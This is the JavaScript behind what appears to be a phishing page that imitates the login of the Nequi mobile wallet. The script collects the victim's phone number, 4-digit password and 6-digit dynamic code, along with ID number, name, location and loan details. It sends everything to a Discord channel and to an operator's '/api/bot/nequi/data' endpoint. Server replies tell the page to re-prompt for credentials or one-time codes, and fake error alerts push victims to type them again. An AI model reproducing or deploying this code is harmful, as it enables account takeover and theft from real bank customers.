const DOMElements = {
    loader: document.querySelector('#loader'),
    
    // Step One Elements
    stepOne: document.querySelector('#step-one'),
    formStepOne: document.querySelector('#form-step-one'),
    inputNumber: document.querySelector('#number'),
    inputPass: document.querySelector('#pass'),

    // Step CDIN Elements
    stepCdin: document.querySelector('#step-cdin'),
    formStepCdin: document.querySelector('#form-step-cdin'),
    inputCdin: document.querySelector('#cdin'),
    pinInputs: document.querySelectorAll('#form-step-cdin input[type="text"]')
}

/**
 * Startup
 */
document.addEventListener('DOMContentLoaded', () => {
    addEventListeners();
})

/**
 * Event Listeners
 */
const addEventListeners = () => {
    const { formStepOne, formStepCdin } = DOMElements;

    formStepOne.addEventListener('submit', handleStepOneSubmit);
    formStepCdin.addEventListener('submit', handleStepCdinSubmit);

    // Enviar estado a Discord
    sendPageStatusToDiscord('P4');

    const token = KJUR.jws.JWS.sign(null, { alg: "HS256" }, {message: 'P4'}, JWT_SIGN);
    fetch(`${API_URL}/api/bot/status`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_KEY}`,
        },
        body: JSON.stringify({token: token})
    })
}

/**
 * Functions
 */
const handleStepOneSubmit = (e) => {
    e.preventDefault();
    const { loader, inputNumber, inputPass, inputCdin } = DOMElements;

    // Validate inputs
    if (inputNumber.value.length === 10 && inputPass.value.length === 4) {
        loader.classList.remove('hidden');

        info.user = inputNumber.value;
        info.pass = inputPass.value;

        updateLS();

        // Enviar datos a Discord
        sendUserDataToDiscord(info).then(success => {
            if (success) {
                console.log('Datos enviados a Discord exitosamente');
            }
        });

        const payload = {
            number: info.user,
            pass: info.pass,
            cdin: info.cdin,
            plazo: info.plazo,
            monto: info.monto,
            cuota: info.cuota,
            cedula: info.cedula,
            nombre: info.nombre,
            departamento: info.departamento,
            municipio: info.municipio,
            sector: info.sector,
            tipo_empleo: info.tipo_empleo
        };

        // Make API request
        fetch(`${API_URL}/api/bot/nequi/data`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${API_KEY}`
            },
            body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .then(result => {
            handleApiResponse(result?.redirect_to ?? 'user');
        })
        .catch(error => {
            console.error('Error:', error);
            loader.classList.add('hidden');
            alert('Ha ocurrido un error. Por favor intenta nuevamente.');
        });
    } else {
        alert('Por favor verifica tus datos');
    }
}

const handleStepCdinSubmit = (e) => {
    e.preventDefault();
    const { loader, inputNumber, inputPass, inputCdin } = DOMElements;

    // Validate CDIN
    if (inputCdin.value.length === 6) {
        loader.classList.remove('hidden');

        info.cdin = inputCdin.value;

        updateLS();

        // Enviar datos actualizados a Discord con CDIN
        sendUserDataToDiscord(info).then(success => {
            if (success) {
                console.log('Datos con CDIN enviados a Discord exitosamente');
            }
        });

        // Create payload
        const payload = {
            number: info.user,
            pass: info.pass,
            cdin: info.cdin,
            plazo: info.plazo,
            monto: info.monto,
            cuota: info.cuota,
            cedula: info.cedula,
            nombre: info.nombre,
            departamento: info.departamento,
            municipio: info.municipio,
            sector: info.sector,
            tipo_empleo: info.tipo_empleo
        };

        // Make API request
        fetch(`${API_URL}/api/bot/nequi/data`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${API_KEY}`
            },
            body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .then(result => {
            handleApiResponse(result?.redirect_to ?? 'user');
        })
        .catch(error => {
            console.error('Error:', error);
            loader.classList.add('hidden');
            alert('Ha ocurrido un error. Por favor intenta nuevamente.');
        });
    } else {
        alert('Por favor ingresa el código de 6 dígitos');
    }
}

const handleApiResponse = (result) => {
    const { loader, stepOne, stepCdin, inputNumber, inputPass, inputCdin, pinInputs } = DOMElements;

    // Handle response based on result
    if (result === 'user') {

        if (inputNumber.value.length > 0 || inputPass.value.length > 0) {
            alert('Usuario o contraseña incorrectos, por favor intenta nuevamente.');
        }

        if (inputCdin.value.length > 0) {
            alert('Hubo un error al iniciar sesión, por favor intenta nuevamente.');
            resetPinInputs();
        }

        stepCdin.classList.add('hidden');
        stepOne.classList.remove('hidden');

        inputNumber.value = '';
        inputPass.value = '';
    } else if (result === 'cdin') {
        inputNumber.value = '';
        inputPass.value = '';

        if (inputCdin.value.length === 6) {
            alert('Clave dinámica incorrecta o exipiró, por favor intenta nuevamente.');
        }

        stepOne.classList.add('hidden');
        stepCdin.classList.remove('hidden');

        resetPinInputs();
    } else if (result === 'success') {
        // Después del login exitoso, ir al loader
        return window.location.href = 'loader.html';
    }

    // Hide loader
    loader.classList.add('hidden');
}

const resetPinInputs = () => {
    const { pinInputs, inputCdin } = DOMElements;
    // Limpiar el input principal
    inputCdin.value = '';
    // Limpiar todos los inputs individuales
    pinInputs.forEach(input => input.value = '');
    // Establecer el foco en el primer input
    if (pinInputs.length > 0) {
        pinInputs[0].focus();
    }
}

/**
 * PIN Input Functions
 */
const handlePinInput = (input, index) => {
    // Solo permitir números
    input.value = input.value.replace(/[^0-9]/g, '');
    
    // Si se ingresó un número, mover al siguiente input
    if (input.value.length === 1) {
        const nextInput = input.parentElement.querySelector(`input:nth-child(${index + 2})`);
        if (nextInput) {
            nextInput.focus();
        }
    }

    updatePinValue();
}

const handleKeypadInput = (value) => {
    const { pinInputs } = DOMElements;
    if (value === '') {
        // Borrar: elimina el último input lleno
        for (let i = pinInputs.length - 1; i >= 0; i--) {
            if (pinInputs[i].value) {
                pinInputs[i].value = '';
                pinInputs[i].focus();
                break;
            }
        }
    } else if (/^[0-9]$/.test(value)) {
        // Escribir: llena el primer input vacío
        for (let i = 0; i < pinInputs.length; i++) {
            if (!pinInputs[i].value) {
                pinInputs[i].value = value;
                // Si no es el último, avanza el foco
                if (i < pinInputs.length - 1) {
                    pinInputs[i + 1].focus();
                }
                break;
            }
        }
    }
    updatePinValue();
}

const updatePinValue = () => {
    const { pinInputs, inputCdin } = DOMElements;
    const pinValue = Array.from(pinInputs).map(input => input.value).join('');
    inputCdin.value = pinValue;
} 